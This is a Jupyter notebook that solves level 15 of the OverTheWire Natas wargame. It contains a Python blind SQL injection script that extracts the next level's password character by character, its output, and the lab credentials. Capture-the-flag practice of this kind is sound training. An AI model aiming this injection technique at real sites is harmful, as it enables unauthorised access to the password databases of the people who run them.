{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 21,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "--------------------------------------------------\n",
      "current password: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V\n",
      "--------------------------------------------------\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Va\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vb\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vc\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vd\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Ve\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vf\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vg\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vh\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vi\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vj\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vk\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vl\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vm\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vn\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vo\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vp\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vq\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vr\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vs\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vt\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vu\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vv\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vw\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vx\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vy\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32Vz\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VA\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VB\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VC\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VD\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VE\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VF\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VG\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VH\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VI\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VJ\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VK\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VL\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VM\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VN\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VO\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VP\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VQ\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VR\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VS\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VT\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VU\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VV\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VW\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VX\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VY\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32VZ\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V0\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V1\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V2\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V3\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V4\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V5\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V6\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V7\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V8\n",
      "trying TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V9\n",
      "--------------------------------------------------\n",
      "password found: TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V\n",
      "--------------------------------------------------\n"
     ]
    }
   ],
   "source": [
    "import urllib.parse\n",
    "import requests\n",
    "from IPython.display import clear_output\n",
    "\n",
    "def try_inject(username):\n",
    "    url = f\"http://natas15.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&debug=0\"\n",
    "    result = requests.get(url, auth=(\"natas15\", \"TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB\")).text\n",
    "    return \"This user exists.\" in result\n",
    "\n",
    "username = 'natas16\" and BINARY password like \"'\n",
    "password = \"\"\n",
    "\n",
    "while True:\n",
    "    for c in \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\":\n",
    "        print(f\"trying {password}{c}\")\n",
    "        if try_inject(f\"{username}{password}{c}%\"):\n",
    "            clear_output()\n",
    "            password += c\n",
    "            print(\"-\" * 50)\n",
    "            print(f\"current password: {password}\")\n",
    "            print(\"-\" * 50) \n",
    "            break\n",
    "    else:\n",
    "        break\n",
    "\n",
    "print(\"-\" * 50)\n",
    "print(f\"password found: {password}\")\n",
    "print(\"-\" * 50)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [],
   "source": [
    "password = \"trd7izrd5gatjj9pkpeuaolfejhqj32v\"\n",
    "# password: trd7izrd5gatjj9pkpeuaolfejhqj32v"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<html>\n",
      "<head>\n",
      "<!-- This stuff in the header has nothing to do with the level -->\n",
      "<link rel=\"stylesheet\" type=\"text/css\" href=\"http://natas.labs.overthewire.org/css/level.css\">\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/jquery-ui.css\" />\n",
      "<link rel=\"stylesheet\" href=\"http://natas.labs.overthewire.org/css/wechall.css\" />\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-1.9.1.js\"></script>\n",
      "<script src=\"http://natas.labs.overthewire.org/js/jquery-ui.js\"></script>\n",
      "<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src=\"http://natas.labs.overthewire.org/js/wechall.js\"></script>\n",
      "<script>var wechallinfo = { \"level\": \"natas15\", \"pass\": \"TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB\" };</script></head>\n",
      "<body>\n",
      "<h1>natas15</h1>\n",
      "<div id=\"content\">\n",
      "Executing query: SELECT * from users where username=\"natas16\" and password=\"trd7izrd5gatjj9pkpeuaolfejhqj32v\"<br>This user exists.<br><div id=\"viewsource\"><a href=\"index-source.html\">View sourcecode</a></div>\n",
      "</div>\n",
      "</body>\n",
      "</html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "import urllib\n",
    "\n",
    "username = f'natas16\" and BINARY password=\"{password}'\n",
    "url = f\"http://natas15.natas.labs.overthewire.org/index.php?username={urllib.parse.quote(username)}&debug=0\"\n",
    "result = requests.get(url, auth=(\"natas15\", \"TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB\")).text\n",
    "print(result)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n",
      "<html><head>\n",
      "<title>401 Unauthorized</title>\n",
      "</head><body>\n",
      "<h1>Unauthorized</h1>\n",
      "<p>This server could not verify that you\n",
      "are authorized to access the document\n",
      "requested.  Either you supplied the wrong\n",
      "credentials (e.g., bad password), or your\n",
      "browser doesn't understand how to supply\n",
      "the credentials required.</p>\n",
      "<hr>\n",
      "<address>Apache/2.4.52 (Ubuntu) Server at natas16.natas.labs.overthewire.org Port 80</address>\n",
      "</body></html>\n",
      "\n"
     ]
    }
   ],
   "source": [
    "url = \"http://natas16.natas.labs.overthewire.org/\"\n",
    "result = requests.get(url, auth=(\"natas16\", password)).text\n",
    "print(result)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
